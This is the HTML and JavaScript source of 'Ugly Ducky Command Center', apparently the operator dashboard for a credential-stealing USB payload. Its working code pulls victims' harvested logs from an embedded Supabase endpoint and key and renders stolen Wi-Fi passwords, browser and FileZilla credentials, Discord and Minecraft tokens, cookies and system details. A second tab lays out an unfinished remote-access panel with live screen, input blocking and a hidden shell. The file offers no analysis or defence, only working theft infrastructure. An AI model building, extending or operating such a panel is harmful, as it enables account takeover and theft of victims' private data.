<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ugly Ducky | Command Center</title>
    
    <!-- Fonts & Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Inter', 'sans-serif'], mono: ['JetBrains Mono', 'monospace'], },
                    colors: { dark: '#0B0F19', panel: '#151C2C', neon: '#ff4757', neonHover: '#ff6b81' }
                }
            }
        }
    </script>

    <style>
        body { background-color: #0B0F19; color: #e2e8f0; }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #0B0F19; border-radius: 4px; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #ff4757; }

        .glass-panel { background: rgba(21, 28, 44, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .fade-in { animation: fadeIn 0.4s ease-in-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .text-glow { text-shadow: 0 0 10px rgba(255, 71, 87, 0.5); }
        
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.3s ease-in-out; }
        
        /* Blur reveal for passwords */
        .blur-reveal { filter: blur(5px); transition: filter 0.2s; cursor: crosshair; }
        .blur-reveal:hover { filter: blur(0px); }
    </style>
</head>
<body class="min-h-screen flex flex-col font-sans antialiased selection:bg-neon selection:text-white">

    <!-- Navbar -->
    <nav class="glass-panel border-b border-gray-800 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-center md:justify-between h-16">
                <div class="flex items-center gap-3">
                    <i class="fa-solid fa-duck text-neon text-2xl text-glow"></i>
                    <span class="font-bold text-xl tracking-wider text-white uppercase">Ugly<span class="text-neon">Ducky</span></span>
                </div>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="flex-grow max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 w-full">
        
        <!-- Navigation Tabs -->
        <div class="flex justify-center mb-10 fade-in">
            <div class="glass-panel p-1 rounded-lg inline-flex">
                <button onclick="switchTab('extraction')" id="tab-extraction" class="px-6 py-2.5 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-lg">
                    <i class="fa-solid fa-database mr-2"></i> Harvested Logs
                </button>
                <button onclick="switchTab('rat')" id="tab-rat" class="px-6 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white">
                    <i class="fa-solid fa-network-wired mr-2"></i> Live Control (RAT)
                </button>
            </div>
        </div>

        <!-- ========================================== -->
        <!-- TAB 1: DATA EXTRACTION (Private Login View)-->
        <!-- ========================================== -->
        <div id="view-extraction" class="tab-content active">
            <div class="text-center mb-8">
                <h1 class="text-3xl md:text-4xl font-bold text-white mb-3">Secure <span class="text-neon text-glow">Vault</span></h1>
                <p class="text-gray-400">Authenticate with your Ducky ID to view your private harvested logs.</p>
            </div>

            <!-- Input Section -->
            <div class="max-w-xl mx-auto glass-panel p-6 rounded-2xl shadow-xl mb-8">
                <label class="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">Enter Ducky ID</label>
                <div class="flex gap-3">
                    <div class="relative flex-grow">
                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                            <i class="fa-solid fa-key text-gray-500"></i>
                        </div>
                        <input type="text" id="deviceId" placeholder="e.g. JOHNS_DUCKY" autocomplete="off" 
                            class="block w-full pl-11 pr-4 py-3 bg-[#0B0F19] border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-neon focus:border-transparent transition-all font-mono text-lg">
                    </div>
                    <button onclick="fetchData()" id="connectBtn" class="bg-neon hover:bg-neonHover text-white font-bold py-3 px-6 rounded-lg transition-all flex items-center gap-2 shadow-[0_0_15px_rgba(255,71,87,0.4)]">
                        Unlock
                    </button>
                </div>
                <p id="statusMsg" class="mt-3 text-sm text-gray-400 hidden"></p>
            </div>

            <!-- Filters -->
            <div id="filterContainer" class="hidden max-w-7xl mx-auto mb-6 flex flex-wrap gap-2 justify-center border-b border-gray-800 pb-6"></div>

            <!-- Results -->
            <div id="output" class="grid grid-cols-1 lg:grid-cols-2 gap-6 pb-20"></div>
        </div>

        <!-- ========================================== -->
        <!-- TAB 2: LIVE CONTROL (Future Feature UI)    -->
        <!-- ========================================== -->
        <div id="view-rat" class="tab-content">
            <div class="text-center mb-8">
                <h1 class="text-3xl md:text-4xl font-bold text-white mb-3">Live <span class="text-neon text-glow">Session</span> Control</h1>
                <p class="text-gray-400">Real-time interaction and system manipulation. <span class="text-neon font-bold">(In Development)</span></p>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                <!-- Target Selection Panel -->
                <div class="md:col-span-1 glass-panel p-6 rounded-xl h-fit">
                    <h2 class="font-bold text-lg border-b border-gray-700 pb-3 mb-4"><i class="fa-solid fa-crosshairs text-neon mr-2"></i>Active Targets</h2>
                    <div class="space-y-3">
                        <div class="p-3 border border-gray-700 rounded-lg bg-[#0B0F19] flex justify-between items-center cursor-not-allowed opacity-50">
                            <div>
                                <p class="text-sm font-bold">DESKTOP-Q1A2Z</p>
                                <p class="text-xs text-gray-500">Awaiting Payload...</p>
                            </div>
                            <span class="w-3 h-3 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444]"></span>
                        </div>
                    </div>
                </div>

                <!-- Action Grid -->
                <div class="md:col-span-2 glass-panel p-6 rounded-xl">
                    <div class="flex justify-between items-center border-b border-gray-700 pb-3 mb-4">
                        <h2 class="font-bold text-lg"><i class="fa-solid fa-bolt text-neon mr-2"></i>Execution Commands</h2>
                        <span class="text-xs font-mono bg-gray-800 px-2 py-1 rounded text-gray-400">STATUS: OFFLINE</span>
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <button class="bg-[#1a2235] border border-gray-700 p-4 rounded-lg text-left opacity-50 cursor-not-allowed"><i class="fa-solid fa-desktop text-2xl mb-2 text-gray-500"></i><h3 class="font-bold text-white">Live Screen</h3></button>
                        <button class="bg-[#1a2235] border border-gray-700 p-4 rounded-lg text-left opacity-50 cursor-not-allowed"><i class="fa-solid fa-keyboard text-2xl mb-2 text-gray-500"></i><h3 class="font-bold text-white">Block Inputs</h3></button>
                        <button class="bg-[#1a2235] border border-gray-700 p-4 rounded-lg text-left opacity-50 cursor-not-allowed"><i class="fa-solid fa-terminal text-2xl mb-2 text-gray-500"></i><h3 class="font-bold text-white">Hidden Shell</h3></button>
                        <button class="bg-[#1a2235] border border-gray-700 p-4 rounded-lg text-left opacity-50 cursor-not-allowed"><i class="fa-solid fa-power-off text-2xl mb-2 text-gray-500"></i><h3 class="font-bold text-white">Power Options</h3></button>
                    </div>
                </div>
            </div>
        </div>

    </main>

    <!-- Toast Notification -->
    <div id="toast" class="fixed bottom-5 right-5 bg-gray-800 border-l-4 border-neon text-white px-6 py-4 rounded shadow-2xl transition-transform transform translate-y-24 opacity-0 z-50 flex items-center gap-3">
        <i class="fa-solid fa-circle-check text-neon"></i>
        <span id="toastMsg">Copied!</span>
    </div>

    <script>
        // --- TAB LOGIC ---
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-extraction').className = "px-6 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white";
            document.getElementById('tab-rat').className = "px-6 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white";
            
            document.getElementById('view-' + tabId).classList.add('active');
            document.getElementById('tab-' + tabId).className = "px-6 py-2.5 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-lg";
        }

        // --- DATA EXTRACTION LOGIC ---
        const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
        const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
        let globalData = [];

        document.getElementById("deviceId").addEventListener("keypress", function(e) {
            if (e.key === "Enter") { e.preventDefault(); fetchData(); }
        });

        async function fetchData() {
            const deviceId = document.getElementById('deviceId').value.trim();
            const outputDiv = document.getElementById('output');
            const statusMsg = document.getElementById('statusMsg');
            const btn = document.getElementById('connectBtn');
            const filterContainer = document.getElementById('filterContainer');
            
            if (!deviceId) return showToast("Please enter a Ducky ID.", "error");

            statusMsg.classList.remove('hidden');
            statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-neon mr-2"></i>Decrypting vault...';
            btn.disabled = true;
            outputDiv.innerHTML = "";
            filterContainer.classList.add('hidden');

            try {
                const response = await fetch(`${SUPABASE_URL}?device_id=eq.${deviceId}&order=created_at.desc`, {
                    method: 'GET',
                    headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' }
                });

                if (!response.ok) throw new Error("API Error");

                globalData = await response.json();

                if (globalData.length === 0) {
                    statusMsg.innerHTML = '<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>No data logged for this Ducky ID.';
                } else {
                    statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Unlocked. ${globalData.length} logs found.`;
                    buildFilters();
                    renderCards(globalData);
                }
            } catch (error) {
                statusMsg.innerHTML = `<i class="fa-solid fa-xmark text-red-500 mr-2"></i>Connection failed.`;
            } finally {
                btn.disabled = false;
            }
        }

        // --- FILTER & RENDER LOGIC ---
        function buildFilters() {
            const container = document.getElementById('filterContainer');
            container.innerHTML = '';
            container.classList.remove('hidden');

            const categories = [...new Set(globalData.map(item => item.category))];
            container.appendChild(createFilterBtn('All', true));
            categories.forEach(cat => container.appendChild(createFilterBtn(cat, false)));
        }

        function createFilterBtn(text, isActive) {
            const btn = document.createElement('button');
            const activeClasses = 'bg-neon text-white font-bold shadow-[0_0_10px_rgba(255,71,87,0.4)] border-neon';
            const inactiveClasses = 'bg-panel text-gray-400 border-gray-700 hover:text-white hover:border-gray-500';
            btn.className = `px-4 py-2 rounded-full border text-sm transition-all duration-200 filter-btn ${isActive ? activeClasses : inactiveClasses}`;
            btn.innerText = text;
            
            btn.onclick = () => {
                document.querySelectorAll('.filter-btn').forEach(b => b.className = `px-4 py-2 rounded-full border text-sm transition-all duration-200 filter-btn ${inactiveClasses}`);
                btn.className = `px-4 py-2 rounded-full border text-sm transition-all duration-200 filter-btn ${activeClasses}`;
                renderCards(text === 'All' ? globalData : globalData.filter(item => item.category === text));
            };
            return btn;
        }

        function renderCards(data) {
            const outputDiv = document.getElementById('output');
            outputDiv.innerHTML = '';

            data.forEach((item, index) => {
                let icon = 'fa-file-code';
                if(item.category.includes('Wi-Fi')) icon = 'fa-wifi';
                if(item.category.includes('System')) icon = 'fa-server';
                if(item.category.includes('Password') || item.category.includes('Cred')) icon = 'fa-key';
                if(item.category.includes('Cookie')) icon = 'fa-cookie-bite';
                if(item.category.includes('Discord')) icon = 'fa-discord';
                if(item.category.includes('Minecraft')) icon = 'fa-cube';

                const htmlContent = parseToHTML(item.category, item.content);

                const card = document.createElement('div');
                card.className = `glass-panel rounded-xl overflow-hidden fade-in flex flex-col h-full`;
                card.style.animationDelay = `${index * 0.05}s`;
                
                card.innerHTML = `
                    <div class="px-5 py-3 border-b border-gray-800 flex justify-between items-center bg-[#1a2235]">
                        <div class="flex items-center gap-3">
                            <i class="fa-solid ${icon} text-neon"></i>
                            <div>
                                <h3 class="font-bold text-white text-sm uppercase tracking-wider">${item.category}</h3>
                            </div>
                        </div>
                        <div class="flex items-center gap-3">
                            <span class="text-xs text-gray-500">${new Date(item.created_at).toLocaleString()}</span>
                            <button onclick="copyData(this)" class="text-gray-400 hover:text-neon transition-colors p-1" title="Copy Raw"><i class="fa-regular fa-copy"></i></button>
                        </div>
                    </div>
                    <div class="p-0 flex-grow bg-[#0f1423] max-h-[350px] overflow-y-auto">
                        <textarea class="hidden-raw-data hidden">${item.content}</textarea>
                        ${htmlContent}
                    </div>
                `;
                outputDiv.appendChild(card);
            });
        }

        // *** THE BEAUTIFIER PARSER *** (Wi-Fi Bug Fixed!)
        function parseToHTML(category, content) {
            let defaultRaw = `<pre class="p-4 font-mono text-xs text-gray-300 whitespace-pre-wrap break-all">${escapeHtml(content)}</pre>`;
            
            try {
                // FIXED: Handle Wi-Fi Separately (SSID instead of URL)
                if (category.includes('Wi-Fi')) {
                    const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
                    let rows = blocks.map(block => {
                        let ssidMatch = block.match(/SSID:\s*(.*)/i);
                        let passMatch = block.match(/PASS:\s*(.*)/i);
                        
                        let ssid = ssidMatch ? escapeHtml(ssidMatch[1]) : 'Unknown';
                        let pass = passMatch ? escapeHtml(passMatch[1]) : 'N/A';
                        
                        return `<tr class="border-b border-gray-800 hover:bg-[#1a2235] transition-colors">
                            <td class="px-4 py-3 text-neon font-bold w-1/2 break-all">${ssid}</td>
                            <td class="px-4 py-3 font-mono text-white blur-reveal bg-black/30 rounded break-all w-1/2" title="Hover to reveal">${pass}</td>
                        </tr>`;
                    }).join('');
                    if (rows) return `<table class="w-full text-left text-sm table-fixed"><thead class="bg-[#0B0F19] text-gray-500 uppercase text-xs"><tr><th class="px-4 py-2 w-1/2">Network (SSID)</th><th class="px-4 py-2 w-1/2">Password</th></tr></thead><tbody>${rows}</tbody></table>`;
                }

                // Handle Browsers & Credentials (URL/USER/PASS)
                if (category.includes('Password') || category.includes('Cred') || category.includes('FileZilla')) {
                    const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
                    let rows = blocks.map(block => {
                        let urlMatch = block.match(/(?:URL|HOST|TARGET):\s*(.*)/i);
                        let userMatch = block.match(/USER:\s*(.*)/i);
                        let passMatch = block.match(/PASS:\s*(.*)/i);
                        
                        let url = urlMatch ? escapeHtml(urlMatch[1]) : 'N/A';
                        let user = userMatch ? escapeHtml(userMatch[1]) : 'N/A';
                        let pass = passMatch ? escapeHtml(passMatch[1]) : 'N/A';
                        
                        return `<tr class="border-b border-gray-800 hover:bg-[#1a2235] transition-colors">
                            <td class="px-4 py-3 text-neon truncate max-w-[120px]" title="${url}">${url}</td>
                            <td class="px-4 py-3 text-gray-300 truncate max-w-[100px]">${user}</td>
                            <td class="px-4 py-3 font-mono text-white blur-reveal bg-black/30 rounded" title="Hover to reveal">${pass}</td>
                        </tr>`;
                    }).join('');
                    if (rows) return `<table class="w-full text-left text-sm table-fixed"><thead class="bg-[#0B0F19] text-gray-500 uppercase text-xs"><tr><th class="px-4 py-2 w-1/3">Target / URL</th><th class="px-4 py-2 w-1/3">Username</th><th class="px-4 py-2 w-1/3">Password</th></tr></thead><tbody>${rows}</tbody></table>`;
                }

                // Parse Discord & Minecraft Tokens
                if (category.includes('Discord') || category.includes('Minecraft')) {
                    const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
                    let rows = blocks.map(block => {
                        let tokenMatch = block.match(/TOKEN:\s*(.*)/i);
                        let sourceMatch = block.match(/(?:SOURCE|PROFILE):\s*(.*)/i);
                        let token = tokenMatch ? escapeHtml(tokenMatch[1]) : 'N/A';
                        let source = sourceMatch ? escapeHtml(sourceMatch[1]) : 'Unknown';
                        return `<div class="p-3 border-b border-gray-800 flex flex-col gap-1">
                            <div class="text-xs text-gray-500 uppercase">${source}</div>
                            <div class="font-mono text-sm text-neon bg-black/40 p-2 rounded blur-reveal break-all">${token}</div>
                        </div>`;
                    }).join('');
                    if (rows) return `<div class="flex flex-col">${rows}</div>`;
                }

                // Parse System Info
                if (category === 'System Info') {
                    const lines = content.split('\n').filter(l => l.trim().length > 0 && !l.includes('---'));
                    let gridItems = lines.map(line => {
                        let parts = line.includes(':') ? line.split(':') : line.split('=');
                        if (parts.length >= 2) {
                            let key = parts.shift().trim();
                            let val = parts.join(':').trim();
                            return `<div class="bg-[#0B0F19] p-3 rounded border border-gray-800"><div class="text-gray-500 text-[10px] uppercase tracking-wider mb-1">${escapeHtml(key)}</div><div class="text-white font-mono text-sm truncate" title="${escapeHtml(val)}">${escapeHtml(val)}</div></div>`;
                        } return '';
                    }).join('');
                    if (gridItems) return `<div class="p-4 grid grid-cols-2 gap-3">${gridItems}</div>`;
                }

            } catch (e) {
                return defaultRaw; // Fallback if parsing fails
            }
            return defaultRaw;
        }

        // Helper to escape HTML tags in raw text
        function escapeHtml(unsafe) {
            return unsafe
                 .replace(/&/g, "&amp;")
                 .replace(/</g, "&lt;")
                 .replace(/>/g, "&gt;")
                 .replace(/"/g, "&quot;")
                 .replace(/'/g, "&#039;");
        }

        function copyData(btnElement) {
            const dataToCopy = btnElement.closest('.glass-panel').querySelector('.hidden-raw-data').value;
            navigator.clipboard.writeText(dataToCopy).then(() => {
                showToast("Raw payload data copied!");
                const icon = btnElement.querySelector('i');
                icon.className = "fa-solid fa-check text-green-400";
                setTimeout(() => icon.className = "fa-regular fa-copy", 2000);
            });
        }

        function showToast(message, type="success") {
            const toast = document.getElementById('toast');
            const icon = toast.querySelector('i');
            document.getElementById('toastMsg').innerText = message;
            
            if(type === "error") {
                toast.classList.replace('border-neon', 'border-red-500');
                icon.className = "fa-solid fa-triangle-exclamation text-red-500";
            } else {
                toast.classList.replace('border-red-500', 'border-neon');
                icon.className = "fa-solid fa-circle-check text-neon";
            }

            toast.classList.replace('translate-y-24', 'translate-y-0');
            toast.classList.replace('opacity-0', 'opacity-100');
            setTimeout(() => {
                toast.classList.replace('translate-y-0', 'translate-y-24');
                toast.classList.replace('opacity-100', 'opacity-0');
            }, 3000);
        }
    </script>
</body>
</html>
